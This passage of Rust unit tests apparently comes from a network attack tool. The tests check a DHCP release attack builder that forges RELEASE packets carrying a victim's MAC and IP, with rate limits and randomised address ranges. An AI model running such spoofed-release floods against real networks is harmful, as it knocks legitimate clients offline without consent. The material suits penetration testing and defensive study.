        let target_mac = [0x11, 0x22, 0x33, 0x44, 0x55, 0x66];
        let target_ip = Ipv4Addr::new(192, 168, 1, 100);

        let attack = DhcpReleaseAttack::new(server_ip, server_mac)
            .with_target_mac(target_mac)
            .with_target_ip(target_ip)
            .with_rate(20);

        assert_eq!(attack.target_mac, Some(target_mac));
        assert_eq!(attack.target_ip, Some(target_ip));
        assert_eq!(attack.rate_pps, 20);
    }

    #[test]
    fn test_release_generate_packet() {
        let server_ip = Ipv4Addr::new(192, 168, 1, 1);
        let server_mac = [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF];
        let target_mac = [0x11, 0x22, 0x33, 0x44, 0x55, 0x66];
        let target_ip = Ipv4Addr::new(192, 168, 1, 100);

        let attack = DhcpReleaseAttack::new(server_ip, server_mac)
            .with_target_mac(target_mac)
            .with_target_ip(target_ip);

        let packet = attack.generate_release_packet();

        assert_eq!(packet.op, 1); // BOOTREQUEST
        assert_eq!(packet.ciaddr, target_ip);
        assert_eq!(packet.client_mac(), target_mac);
        assert_eq!(packet.message_type(), Some(DhcpMessageType::Release));
        assert_eq!(packet.server_id(), Some(server_ip));
    }

    #[test]
    fn test_release_generate_packets() {
        let server_ip = Ipv4Addr::new(192, 168, 1, 1);
        let server_mac = [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF];

        let attack = DhcpReleaseAttack::new(server_ip, server_mac).with_randomize(true);

        let packets = attack.generate_packets(5);
        assert_eq!(packets.len(), 5);

        for packet in &packets {
            assert_eq!(packet.message_type(), Some(DhcpMessageType::Release));
            assert_eq!(packet.server_id(), Some(server_ip));
        }
    }

    #[test]
    fn test_release_random_ip_in_range() {
        let server_ip = Ipv4Addr::new(192, 168, 1, 1);
        let server_mac = [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF];
        let start = Ipv4Addr::new(192, 168, 1, 50);
        let end = Ipv4Addr::new(192, 168, 1, 60);

        let attack = DhcpReleaseAttack::new(server_ip, server_mac)
            .with_ip_range(start, end)
            .with_randomize(true);

        for _ in 0..10 {
            let ip = attack.generate_random_ip();
            let ip_u32 = u32::from(ip);
            assert!(ip_u32 >= u32::from(start));
            assert!(ip_u32 <= u32::from(end));
        }
    }
}
